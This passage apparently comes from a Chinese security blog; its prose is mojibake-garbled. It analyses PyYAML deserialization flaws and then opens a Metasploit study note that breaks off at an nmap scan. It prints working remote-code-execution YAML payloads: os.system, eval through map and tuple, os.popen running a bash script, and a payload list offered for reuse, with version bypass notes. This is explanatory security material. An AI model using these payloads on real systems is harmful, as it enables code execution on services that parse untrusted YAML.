yaml.load(\"!!python/module:yaml_test\") #expæ–¹æ³•æ˜¯éšæ„å†™çš„ï¼Œæ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†å¿…é¡»è¦æœ‰ï¼Œå› ä¸ºè¿™æ˜¯å‘½åè§„åˆ™ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œä¸»è¦æ˜¯æ–‡ä»¶åyaml_testè¦å†™å¯¹ yaml.load(\"!!python/object:yaml_test.exp\" ) yaml.load(\"!!python/name:yaml_test.exp\" ) éƒ½èƒ½æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ å½“ç„¶!!python/object/newå’Œ!!python/object/applyä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹å¼å®ç°åˆ©ç”¨ yaml.load('!!python/object/apply:yaml_test.exp {}' ) yaml.load('!!python/object/new:yaml_test.exp {}' ) å¦‚æœæˆ‘ä»¬è°ƒè¯•åˆ†æå°±çŸ¥é“æœ€ç»ˆçš„nameä¼šè¢«èµ‹å€¼ä¸ºyaml_textï¼Œè€Œè¢«importå¯¼å…¥ï¼Œå¯¼å…¥ä¹‹åï¼Œå…¶ä¸­çš„ä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œï¼Œè¿›è€Œå¼¹å‡ºè®¡ç®—å™¨ ä»¥ä¸Šè¦æ±‚æ˜¯åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œå¦‚æœä¸åœ¨åŒä¸€ç›®å½•ä¸‹æ€ä¹ˆåŠï¼Œå¥½æ¯”å¦‚è¿™ç§æƒ…å†µ â”œâ”€â”€ simple.py â””â”€â”€ uploads â””â”€â”€ yaml_test.py é‚£payloadç¨ä½œä¿®æ”¹ï¼Œåœ¨æ–‡ä»¶åå‰åŠ å…¥ç›®å½•åå¯ #ç»è¿‡æµ‹è¯•åªæœ‰modleæ ‡ç­¾å¯è¡Œ yaml.load(\"!!python/module:uploads.yaml_test\" ) è¿™é‡Œåªè¦è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Œåœ¨moduleä¸nameçš„æ ‡ç­¾å¤„ç†ä¸­ å¯¹äºfind_pythonå¯¹åº”å‡½æ•°çš„å¤„ç†ä¸­ï¼Œmoduleæ ‡ç­¾æ²¡æœ‰ç»è¿‡rsplitå‡½æ•°çš„å¤„ç†ï¼Œè€Œnameç»è¿‡äº† å½“ç„¶æ–‡ä»¶åå†™æˆ__init__.pyå°†ä¼šæ›´ç®€å•ï¼Œpayloadåªéœ€ç›®å½•å³å¯ï¼Œè€Œä¸”applyå’Œnewä¸¤ä¸ªæ ‡ç­¾ä¹Ÿå¯ä»¥æ„é€ åˆ©ç”¨äº† yaml.load(\"!!python/module:uploads\" ) #expè¡¨ç¤ºç€ç±»å®ä¾‹ï¼Œå¯ä»¥å†™æˆå…¶ä»–ï¼Œè™½ä¸å­˜åœ¨ä½†æ˜¯ä¸€å®šè¦æœ‰ï¼Œå¦åˆ™æŠ¥é”™ yaml.load('!!python/object/apply:uploads.exp {}' ) yaml.load('!!python/object/new:uploads.exp {}' ) æ¼æ´ä¿®å¤ å¤§äº5.1çš„ç‰ˆæœ¬ï¼Œæ‰“äº†è¡¥ä¸ï¼ˆè¿™é‡Œæ‡’å¾—æ‰¾äº†ï¼Œå°±ç›´æ¥cvæ–‡ç« ï¼‰ é€šè¿‡è°ƒè¯•å‘ç°ï¼Œfind_python_nameæ–¹æ³•ï¼ˆè¿˜æœ‰find_python_mduleæ–¹æ³•ä¹Ÿä¸€æ ·ï¼‰å¢åŠ äº†ä¸€ä¸ªé»˜è®¤unsafeä¸ºfalseçš„å€¼ å°±æ— æ³•ç›´æ¥__import__ï¼Œæœ€ç»ˆä¼šæŠ¥é”™ def find_python_name(self, name, mark, unsafe=False): if not name: raise ConstructorError(\"while constructing a Python object\", mark, \"expected non-empty name appended to the tag\", mark) if u'.' in name: module_name, object_name = name.rsplit('.', 1) else: module_name = '__builtin__' object_name = name if unsafe: try: __import__(module_name) except ImportError, exc: raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find module %r (%s)\" % (module_name.encode('utf-8'), exc), mark) //è¿™é‡ŒæŸ¥çœ‹æ˜¯ä¸æ˜¯åœ¨sys.moudleså­—å…¸é‡Œï¼Œä¸æ˜¯å°±ä¼šè¿›å…¥ç›´æ¥æŠ¥é”™ if module_name not in sys.modules: raise ConstructorError(\"while constructing a Python object\", mark, \"module %r is not imported\" % module_name.encode('utf-8'), mark) module = sys.modules[module_name] if not hasattr(module, object_name): raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find %r in the module %r\" % (object_name.encode('utf-8'), module.__name__), mark) return getattr(module, object_name) æ¥ä¸‹æ¥æ‰§è¡Œè¿™ä¸€æ®µ if not (unsafe or isinstance(cls, type) or isinstance(cls, type(self.classobj))): raise ConstructorError(\"while constructing a Python instance\", node.start_mark, \"expected a class, but found %r\" % type(cls), node.start_mark) PyYaml&gt;5.1 åœ¨Pythonçš„PyYamlåº“ä¸­æä¾›ä»¥ä¸‹æ–¹æ³•å°†pythonå’Œyamlè¿›è¡Œè¯­è¨€æ ¼å¼è½¬æ¢ï¼š load() åœ¨PyYaml&gt;5.1çš„ç‰ˆæœ¬ä¹‹åï¼Œå¦‚æœè¦ä½¿ç”¨load()å‡½æ•°ï¼Œè¦è·Ÿä¸Šä¸€ä¸ªLoaderçš„å‚æ•°ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚(ä¸å½±å“æ­£å¸¸è¾“å‡º) tipsï¼šçœŸå°´å°¬ï¼Œæ„Ÿæƒ…æˆ‘ä¸Šé¢åˆ†æäº†åŠå¤©ï¼Œç”¨çš„éƒ½æ˜¯&gt;5.1çš„ç‰ˆæœ¬ã€‚ã€‚ã€‚ã€‚ä½†ç«Ÿç„¶èƒ½å¤ç°æˆï¼Ÿï¼Ÿ è¿™é‡Œå…¶å®å’ŒPyYaml&lt;=5.1ç‰ˆæœ¬ä¸€æ ·ï¼Œå°±ä¸å¤šèµ˜è¿°ã€‚ load(data, Loader=yaml.Loader) è¿™é‡Œè¯´æ˜ä¸€ä¸‹PyYaml&gt;5.1éƒ½æœ‰å“ªäº›åŠ è½½å™¨ BaseLoaderï¼šä¸æ”¯æŒå¼ºåˆ¶ç±»å‹è½¬æ¢ SafeLoaderï¼šå®‰å…¨åœ°åŠ è½½ YAML æ ¼å¼çš„æ•°æ®ï¼Œé™åˆ¶è¢«åŠ è½½çš„ YAML æ•°æ®ä¸­å¯ç”¨çš„ Python å¯¹è±¡ç±»å‹ï¼Œä»è€Œé˜²æ­¢æ‰§è¡Œå±é™©çš„æ“ä½œæˆ–ä»£ç ã€‚ FullLoaderï¼šåŠ è½½åŒ…å«ä»»æ„ Python å¯¹è±¡çš„ YAML æ•°æ®ï¼ŒFullLoader åŠ è½½å™¨ä¸ä¼šé™åˆ¶è¢«åŠ è½½çš„ YAML æ•°æ®ä¸­å¯ç”¨çš„ Python å¯¹è±¡ç±»å‹ï¼Œå› æ­¤å¯ä»¥åŠ è½½åŒ…å«ä»»æ„ Python å¯¹è±¡çš„ YAML æ•°æ®ã€‚ UnsafeLoaderï¼šåŠ è½½åŒ…å«ä»»æ„ Python å¯¹è±¡çš„ YAML æ•°æ®ï¼Œå¹¶ä¸”ä¸ä¼šå¯¹è¢«åŠ è½½çš„ YAML æ•°æ®ä¸­å¯ç”¨çš„ Python å¯¹è±¡ç±»å‹è¿›è¡Œä»»ä½•é™åˆ¶ã€‚ ä»¥SafeLoaderä¸ºä¾‹ï¼Œç¤ºä¾‹ä»£ç ï¼š import yaml class Person: def __init__(self, name, age): self.name = name self.age = age def person_constructor(loader, node): fields = loader.construct_mapping(node, deep=True) return Person(**fields) yaml_data = \"\"\" - !!python/object:__main__.Person name: Alice age: 25 - !!python/object:__main__.Person name: Bob age: 30 \"\"\" yaml.SafeLoader.add_constructor('tag:yaml.org,2002:python/object:__main__.Person', person_constructor) data = yaml.load(yaml_data, Loader=yaml.SafeLoader) for person in data: print(person.name, person.age) load_all(data, Loader=yaml.Loader) ä»¥SafeLoaderåŠ è½½å™¨ä¸ºä¾‹ï¼Œç¤ºä¾‹ä»£ç ï¼š import yaml class Person: def __init__(self, name, age): self.name = name self.age = age def person_constructor(loader, node): fields = loader.construct_mapping(node, deep=True) return Person(**fields) yaml_data = \"\"\" # ç¬¬ä¸€ä¸ªæ–‡æ¡£ - !!python/object:__main__.Person name: Alice age: 25 # ç¬¬äºŒä¸ªæ–‡æ¡£ - !!python/object:__main__.Person name: Bob age: 30 \"\"\" yaml.SafeLoader.add_constructor('tag:yaml.org,2002:python/object:__main__.Person', person_constructor) data = yaml.load_all(yaml_data, Loader=yaml.SafeLoader) for doc in data: for person in doc: print(person.name, person.age) è¾“å‡ºç»“æœï¼š Alice 25 Bob 30 è¿™é‡Œå…¶å®å’Œload(data, Loader=yaml.Loader)å‡½æ•°ä¸€æ ·ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚ full_load(data) load()ä¸full_load()å‡½æ•°çš„åŒºåˆ«æ˜¯ï¼Œfull_load()ä½¿ç”¨SafeLoaderä½œä¸ºé»˜è®¤è§£æå™¨ã€‚æ‰€ä»¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸å¯¹å®‰å…¨çš„è§£æå™¨ï¼Œå®ƒé™åˆ¶äº†å¯ä»¥æ‰§è¡Œçš„Pythonä»£ç çš„ç±»å‹ã€‚ ç¤ºä¾‹ä»£ç ï¼š import yaml yaml_data = \"\"\" - foo - bar - baz \"\"\" data = yaml.full_load(yaml_data) print(data) è¾“å‡ºç»“æœï¼š ['foo', 'bar', 'baz'] full_load_all(data) full_load_all()ä¸full_load()å‡½æ•°ç±»ä¼¼ï¼Œä½†å¯ä»¥å¤„ç†åŒ…å«å¤šä¸ªYAMLæ–‡æ¡£çš„æ•°æ®æµã€‚ ç¤ºä¾‹ä»£ç ï¼š import yaml yaml_data = \"\"\" - foo - bar - baz --- - alice - bob - charlie \"\"\" data = yaml.full_load_all(yaml_data) for doc in data: print(doc) è¾“å‡ºç»“æœï¼š ['foo', 'bar', 'baz'] ['alice', 'bob', 'charlie'] unsafe_load(data) unsafe_load()å‡½æ•°å¯ä»¥åŠ è½½åŒ…å«è‡ªå®šä¹‰Pythonå¯¹è±¡çš„YAMLæ•°æ®ï¼Œå…è®¸åŠ è½½å’Œæ‰§è¡Œä»»æ„Pythonä»£ç ï¼Œå¹¶å°è¯•å°†å®ƒä»¬ååºåˆ—åŒ–ä¸ºå®é™…çš„Pythonå¯¹è±¡ï¼ˆå­˜åœ¨å®‰å…¨éšæ‚£ï¼‰ ç¤ºä¾‹ä»£ç ï¼š import yaml yaml_data = \"\"\" !!python/object:__main__.Person name: Alice age: 25 \"\"\" class Person: def __init__(self, name, age): self.name = name self.age = age data = yaml.unsafe_load(yaml_data) print(data) è¾“å‡ºç»“æœï¼š &lt;__main__.Person object at 0x0000022DA0D36CD0&gt; unsafe_load_all(data) ç›¸æ¯”unsafe_load()ï¼Œunsafe_load_all()ç”¨äºå°†å¤šä¸ªYAMLæ–‡æ¡£åŠ è½½ä¸ºPythonå¯¹è±¡çš„ç”Ÿæˆå™¨ã€‚ ç¤ºä¾‹ä»£ç ï¼š import yaml yaml_data = \"\"\" - foo - bar - baz --- - !!python/object:__main__.Person name: Alice age: 25 \"\"\" class Person: def __init__(self, name, age): self.name = name self.age = age data = yaml.unsafe_load_all(yaml_data) for doc in data: print(doc) è¾“å‡ºç»“æœï¼š ['foo', 'bar', 'baz'] [&lt;__main__.Person object at 0x00000174FFEBD210&gt;] æ¼æ´æˆå›  è¿™é‡Œçš„æ¼æ´æˆå› å’ŒPyYaml&lt;=5.1ä¸€æ ·ï¼Œéƒ½æ˜¯constructor.pyä¸­çš„ä¸€äº›ä¸ä¸¥è°¨çš„ä»£ç å¼•èµ·çš„æ¼æ´ã€‚ æ¼æ´åˆ©ç”¨ æˆ‘è¿™é‡Œé€‰ç”¨æµ‹è¯•çš„PyYamlç‰ˆæœ¬æ˜¯5.1.1ç‰ˆæœ¬ã€‚ åœ¨PyYaml&gt;5.1çš„ç‰ˆæœ¬ä¹‹åï¼ŒFullloaderè¿™ä¸ªåŠ è½½å™¨å¯¹äºpayloadçš„é™åˆ¶æ¯”è¾ƒå¤šäº†ï¼Œæˆ‘ä»¬å»¶ç”¨PyYamlçš„pocè¿˜æ˜¯å¯ä»¥çš„ï¼Œåªä¸è¿‡è¦ä¿®æ”¹ä¸€ä¸‹ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨pythonå†…ç½®çš„builtinsæ¨¡å—(å› ä¸ºä¹‹å‰æˆ‘ä»¬å®¡è®¡constructor.pyæ—¶ï¼Œå‘ç°å®šä¹‰çš„find_python_name()ä¸­ï¼Œå¦‚æœä¸ç”¨\".\"å°†æ¨¡å—åå’Œå¯¹è±¡ååˆ†å¼€ï¼Œä¼šé»˜è®¤è°ƒç”¨builtinsæ¨¡å—) PyYaml&lt;=5.1çš„poc from yaml import * poc= b\"\"\"!!python/object/apply:os.system - calc\"\"\" #subprocess.check_output #os.popen #subprocess.run #subprocess.call #subprocess.Popen yaml.load(poc,Loader=Loader) builtinsæ¨¡å—ä¸­çš„å†…ç½®å‡½æ•° builtinsæ˜¯pythonçš„å†…å»ºæ¨¡å—ï¼Œæ‰€è°“å†…å»ºæ¨¡å—å°±æ˜¯ä½ åœ¨ä½¿ç”¨æ—¶ä¸éœ€è¦importï¼Œåœ¨pythonå¯åŠ¨åï¼Œåœ¨æ²¡æœ‰æ‰§è¡Œç¨‹åºå‘˜ç¼–å†™çš„ä»»ä½•ä»£ç å‰ï¼Œpythonä¼šåŠ è½½å†…å»ºæ¨¡å—ä¸­çš„å‡½æ•°åˆ°å†…å­˜ä¸­ã€‚ å‘ç°åœ¨find_python_nameå¤„ç†ä¸å¸¦.ï¼Œä¹Ÿå°±æ˜¯moduleä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œè‡ªåŠ¨é»˜è®¤moduleä¸ºbuiltinsï¼Œå¹¶ä¸”è¯¥æ¨¡å—æ˜¯åœ¨sys.modulesä¸­çš„ é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ˜ç¡®builtinsä¸­çš„æ‰€æœ‰çš„ç±»ï¼Œä»è€Œç­›é€‰å‡ºå¯ä»¥åˆ©ç”¨çš„ç±» import builtins builtin_classes = [] for obj_name in dir(builtins): obj = getattr(builtins, obj_name) if isinstance(obj, type): builtin_classes.append(obj) print(builtin_classes) [&lt;class 'ArithmeticError'&gt;, &lt;class 'AssertionError'&gt;, &lt;class 'AttributeError'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'BlockingIOError'&gt;, &lt;class 'BrokenPipeError'&gt;, &lt;class 'BufferError'&gt;, &lt;class 'BytesWarning'&gt;, &lt;class 'ChildProcessError'&gt;, &lt;class 'ConnectionAbortedError'&gt;, &lt;class 'ConnectionError'&gt;, &lt;class 'ConnectionRefusedError'&gt;, &lt;class 'ConnectionResetError'&gt;, &lt;class 'DeprecationWarning'&gt;, &lt;class 'EOFError'&gt;, &lt;class 'OSError'&gt;, &lt;class 'Exception'&gt;, &lt;class 'FileExistsError'&gt;, &lt;class 'FileNotFoundError'&gt;, &lt;class 'FloatingPointError'&gt;, &lt;class 'FutureWarning'&gt;, &lt;class 'GeneratorExit'&gt;, &lt;class 'OSError'&gt;, &lt;class 'ImportError'&gt;, &lt;class 'ImportWarning'&gt;, &lt;class 'IndentationError'&gt;, &lt;class 'IndexError'&gt;, &lt;class 'InterruptedError'&gt;, &lt;class 'IsADirectoryError'&gt;, &lt;class 'KeyError'&gt;, &lt;class 'KeyboardInterrupt'&gt;, &lt;class 'LookupError'&gt;, &lt;class 'MemoryError'&gt;, &lt;class 'ModuleNotFoundError'&gt;, &lt;class 'NameError'&gt;, &lt;class 'NotADirectoryError'&gt;, &lt;class 'NotImplementedError'&gt;, &lt;class 'OSError'&gt;, &lt;class 'OverflowError'&gt;, &lt;class 'PendingDeprecationWarning'&gt;, &lt;class 'PermissionError'&gt;, &lt;class 'ProcessLookupError'&gt;, &lt;class 'RecursionError'&gt;, &lt;class 'ReferenceError'&gt;, &lt;class 'ResourceWarning'&gt;, &lt;class 'RuntimeError'&gt;, &lt;class 'RuntimeWarning'&gt;, &lt;class 'StopAsyncIteration'&gt;, &lt;class 'StopIteration'&gt;, &lt;class 'SyntaxError'&gt;, &lt;class 'SyntaxWarning'&gt;, &lt;class 'SystemError'&gt;, &lt;class 'SystemExit'&gt;, &lt;class 'TabError'&gt;, &lt;class 'TimeoutError'&gt;, &lt;class 'TypeError'&gt;, &lt;class 'UnboundLocalError'&gt;, &lt;class 'UnicodeDecodeError'&gt;, &lt;class 'UnicodeEncodeError'&gt;, &lt;class 'UnicodeError'&gt;, &lt;class 'UnicodeTranslateError'&gt;, &lt;class 'UnicodeWarning'&gt;, &lt;class 'UserWarning'&gt;, &lt;class 'ValueError'&gt;, &lt;class 'Warning'&gt;, &lt;class 'OSError'&gt;, &lt;class 'ZeroDivisionError'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'bool'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'classmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'dict'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'filter'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'int'&gt;, &lt;class 'list'&gt;, &lt;class 'map'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'object'&gt;, &lt;class 'property'&gt;, &lt;class 'range'&gt;, &lt;class 'reversed'&gt;, &lt;class 'set'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'str'&gt;, &lt;class 'super'&gt;, &lt;class 'tuple'&gt;, &lt;class 'type'&gt;, &lt;class 'zip'&gt;] ç°åœ¨å°±æ˜¯æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»äº†ï¼Œç»§ç»­å›åˆ°æˆ‘ä»¬çš„constructor.pyä¸­ï¼Œè¿›ä¸€æ­¥å®¡è®¡ construct_python_object_apply()æ—¶ï¼Œå‘ç°äº†ä¸€ä¸ªæ¼æ´ç‚¹ å¦‚æœlistitemsä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨instanceçš„extend()æ–¹æ³•ï¼Œå°†listitemsä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ åˆ°instanceåˆ—è¡¨å¯¹è±¡çš„æœ«å°¾ï¼Œinstanceæ˜¯æˆ‘ä»¬åˆ›å»ºçš„å®ä¾‹ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å®šä¹‰listitemsæ˜¯ä»€ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬çš„listitemsæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè€Œä¸”å…¶å†…å®¹æœ‰\"{â€˜extendâ€™:function}\"ï¼Œè¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨extendè¿›è¡Œä»»æ„å‡½æ•°çš„æ‰§è¡Œäº†ã€‚ ä½†æ˜¯ï¼Œç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä¸Šé¢builtinsä¸­çš„è¿™äº›ç±»ä¸­ï¼Œåªæœ‰frozensetï¼Œbytesï¼Œtupleè¿™ä¸‰ä¸ªç±»å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸ºäº†ææ¸…æ¥šä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬ç»§ç»­å®¡è®¡æºç ã€‚ æˆ‘ä»¬æ¥ç€çœ‹make_python_instance()ï¼Œ è¿™é‡Œåªè¦æˆ‘ä»¬çš„å†…ç½®ç±»å¯ä»¥æ‰§è¡Œcls.__new__(cls, *args, **kwds)è¿™æ®µä»£ç ï¼Œå°±å¯ä»¥æ ¹æ®å‚æ•°æ¥åŠ¨æ€åˆ›å»ºæ–°çš„Pythonå¯¹è±¡ï¼Œä»è€Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ æ‰€ä»¥çŒœæµ‹frozensetï¼Œbytesï¼Œtupleåº”è¯¥æ˜¯å¯ä»¥æ‰§è¡Œä¸Šè¿°ä»£ç ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ payload !!python/object/new:bytes - !!python/object/new:map - !!python/name:eval - [\"__import__\\x28'pickle'\\x29.load\\x28open\\x28'fileinfo/pik','rb'\\x29\\x29\"] !!python/object/new:frozenset - !!python/object/new:map - !!python/name:os.popen - [\"bash /app/fileinfo/cmd\"] !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\"print(123)\"] å‘ç°éƒ½æ˜¯æœ‰å›æ˜¾çš„ï¼Œè¿™é‡Œé¡ºä¾¿é™„ä¸Šä¸€äº›æ–‡ç« æ‰¾åˆ°çš„payloadï¼Œä¾›å¤§å®¶ä½¿ç”¨: #æŠ¥é”™ä½†æ˜¯æ‰§è¡Œäº† - !!python/object/new:str args: [] state: !!python/tuple - \"__import__('os').system('whoami')\" - !!python/object/new:staticmethod args: [0] state: update: !!python/name:exec - !!python/object/new:yaml.MappingNode listitems: !!str '!!python/object/apply:subprocess.Popen [whoami]' state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load #åˆ›å»ºäº†ä¸€ä¸ªç±»å‹ä¸ºzçš„æ–°å¯¹è±¡,è€Œå¯¹è±¡ä¸­extendå±æ€§åœ¨åˆ›å»ºæ—¶ä¼šè¢«è°ƒç”¨,å‚æ•°ä¸ºlistitemså†…çš„å‚æ•° !!python/object/new:type args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }] listitems: \"__import__('os').system('whoami')\" æˆ‘ä»¬å¯ä»¥ç”¨pythonçš„å†…ç½®å‡½æ•°evalï¼ˆæˆ–è€…execï¼‰æ¥æ‰§è¡Œä»£ç ï¼Œç”¨mapæ¥è§¦å‘å‡½æ•°æ‰§è¡Œï¼Œç”¨tupleå°†mapå¯¹è±¡è½¬åŒ–ä¸ºå…ƒç»„è¾“å‡ºæ¥ï¼ˆå½“ç„¶ç”¨listã€frozensetã€byteséƒ½å¯ä»¥ï¼‰ï¼Œç”¨pythonå†™å‡ºæ¥å¦‚ä¸‹ tuple(map(eval, [\"__import__('os').system('whoami')\"])) å˜ä¸ºyaml yaml.load(\"\"\" !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\"__import__('os').system('whoami')\"] \"\"\") PS: å½“åˆ©ç”¨ä¸Šè¿°payloadæµ‹è¯•åˆ°5.2b1ç‰ˆæœ¬æ—¶ï¼Œå‘ç°æ— æ³•åˆ©ç”¨é’ˆå¯¹!!python/object/applyæ ‡ç­¾çš„payloadäº†ï¼Œåˆ«çš„éƒ½å¯ä»¥åˆ©ç”¨ ä¸Šè¿°payloadå½“æˆ‘æµ‹è¯•åˆ°5.4b1ç‰ˆæœ¬æ—¶ï¼Œå‘ç°åªæœ‰åˆ©ç”¨é’ˆå¯¹!!python/nameæ ‡ç­¾çš„payloadå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œåˆ«çš„payloadéƒ½ä¸èƒ½ç”¨äº† ä¸€äº›é«˜ç‰ˆæœ¬çš„ç»•è¿‡æ–¹å¼ï¼Œç”±äºä¸æ˜¯å¾ˆå¸¸è§ï¼Œè¿™é‡Œå°±ä¸å¤šä»‹ç»äº† å½“ç‰ˆæœ¬å¤§äºç­‰äº5.3.1:Prevents arbitrary code execution during python/object/new constructor by ret2libc Â· Pull Request #386 Â· yaml/pyyaml Â· GitHub å½“ç‰ˆæœ¬å¤§äºç­‰äº6.0:Prevents arbitrary code execution during python/object/new constructor by ret2libc Â· Pull Request #386 Â· yaml/pyyaml Â· GitHub åˆ©ç”¨ruamel.yamlè¯»å†™yamlæ–‡ä»¶ åœ¨ç½‘ä¸Šæœèµ„æ–™çš„æ—¶å€™ï¼Œå‘ç°äº†ä¹Ÿå¯ä»¥åˆ©ç”¨ruamel.yamlè¯»å†™yamlæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘åœ¨æƒ³ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå­˜åœ¨PyYamlååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è¡Œæµ‹è¯•ä¸€ä¸‹ã€‚ è¿™é‡Œè¿˜æ˜¯æ²¿ç”¨PyYaml&gt;5.1çš„poc import ruamel.yaml poc= b\"\"\"!!python/object/apply:os.system - calc\"\"\" ruamel.yaml.load(poc)#py2ä¸‹è¿è¡Œ 0x05 å‚è€ƒæ–‡ç«  PyYAMLååºåˆ—åŒ–æ¼æ´ æµ…è°ˆPyYAMLååºåˆ—åŒ–æ¼æ´ PyYamlååºåˆ—åŒ–æ¼æ´è¯¦è§£ SecMap - ååºåˆ—åŒ–ï¼ˆPyYAMLï¼‰","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"Metasploitå­¦ä¹ ","path":"/2024/03/23/metasploit-xue-xi/","content":"0x01 ç®€ä»‹ åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•ä½¿ç”¨Metasploitè¿›è¡Œæ¼æ´æ‰«æå’Œåˆ©ç”¨ã€‚æˆ‘ä»¬è¿˜å°†ä»‹ç»æ•°æ®åº“åŠŸèƒ½å¦‚ä½•ä½¿ç®¡ç†æ›´å¹¿æ³›èŒƒå›´çš„æ¸—é€æµ‹è¯•æ´»åŠ¨å˜å¾—æ›´å®¹æ˜“ã€‚æœ€åï¼Œæˆ‘ä»¬å°†ç ”ç©¶ä½¿ç”¨ msfvenom ç”Ÿæˆæœ‰æ•ˆè´Ÿè½½ä»¥åŠå¦‚ä½•åœ¨å¤§å¤šæ•°ç›®æ ‡å¹³å°ä¸Šå¯åŠ¨ Meterpreter ä¼šè¯ã€‚ æ›´å…·ä½“åœ°è¯´ï¼Œæˆ‘ä»¬å°†è®¨è®ºçš„ä¸»é¢˜æ˜¯ï¼š å¦‚ä½•ä½¿ç”¨ Metasploit æ‰«æç›®æ ‡ç³»ç»Ÿã€‚ å¦‚ä½•ä½¿ç”¨ Metasploit æ•°æ®åº“åŠŸèƒ½ã€‚ å¦‚ä½•ä½¿ç”¨Metasploitè¿›è¡Œæ¼æ´æ‰«æã€‚ å¦‚ä½•ä½¿ç”¨ Metasploit æ¥åˆ©ç”¨ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ˜“å—æ”»å‡»çš„æœåŠ¡ã€‚ å¦‚ä½•ç”¨äºåˆ›å»ºæœ‰æ•ˆè´Ÿè½½å¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè·å– Meterpreter ä¼šè¯ã€‚ è¯·æ³¨æ„ï¼Œå¯¹äºæ‰€æœ‰éœ€è¦ä½¿ç”¨å•è¯åˆ—è¡¨çš„é—®é¢˜ï¼ˆä¾‹å¦‚æš´åŠ›æ”»å‡»ï¼‰ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä½äºä»¥ä¸‹è·¯å¾„çš„ AttackBox ä¸Šçš„å•è¯åˆ—è¡¨ï¼š /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt å¦‚æœæ‚¨é€‰æ‹©ä½¿ç”¨è‡ªå·±çš„æœºå™¨ï¼Œè¯·å•å‡»å³ä¾§çš„â€œä¸‹è½½ä»»åŠ¡æ–‡ä»¶â€æŒ‰é’®ä¸‹è½½å•è¯è¡¨ã€‚ å¯åŠ¨ AttackBox å¹¶ä½¿ç”¨è¯¥æˆ¿é—´ä¸­çš„å‘½ä»¤è¿è¡Œ Metasploitã€‚ 0x02 æ‰«æ ç«¯å£æ‰«æ Metasploit æœ‰è®¸å¤šæ¨¡å—å¯ä»¥æ‰«æç›®æ ‡ç³»ç»Ÿå’Œç½‘ç»œä¸Šçš„å¼€æ”¾ç«¯å£ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ search portscan å‘½ä»¤åˆ—å‡ºå¯ç”¨çš„æ½œåœ¨ç«¯å£æ‰«ææ¨¡å—ã€‚ ç«¯å£æ‰«ææ¨¡å—å°†è¦æ±‚æ‚¨è®¾ç½®ä¸€äº›é€‰é¡¹ï¼š CONCURRENCYï¼šåŒæ—¶æ‰«æçš„ç›®æ ‡æ•°é‡ã€‚ PORTSï¼šè¦æ‰«æçš„ç«¯å£èŒƒå›´ã€‚è¯·æ³¨æ„ï¼Œæ­¤å¤„çš„ 1-10000 ä¸ä½¿ç”¨é»˜è®¤é…ç½®çš„ Nmap ä¸åŒã€‚ Nmap å°†æ‰«ææœ€å¸¸ç”¨çš„ 1000 ä¸ªç«¯å£ï¼Œè€Œ Metasploit å°†æ‰«æä» 1 åˆ° 10000 çš„ç«¯å£å·ã€‚ RHOTSï¼šè¦æ‰«æçš„ç›®æ ‡æˆ–ç›®æ ‡ç½‘ç»œã€‚ THREADSï¼šå°†åŒæ—¶ä½¿ç”¨çš„çº¿ç¨‹æ•°ã€‚æ›´å¤šçº¿ç¨‹å°†å¯¼è‡´æ›´å¿«çš„æ‰«æã€‚ æ‚¨å¯ä»¥ç›´æ¥ä» msfconsole æç¤ºç¬¦æ‰§è¡Œ Nmap æ‰«æï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œé€Ÿåº¦æ›´å¿«ï¼š msf6 &gt; nmap -sS 10.10.12.229 [*] exec: nmap -sS 10.10.12.229 Starting Nmap 7.60 ( https://nmap.org ) at 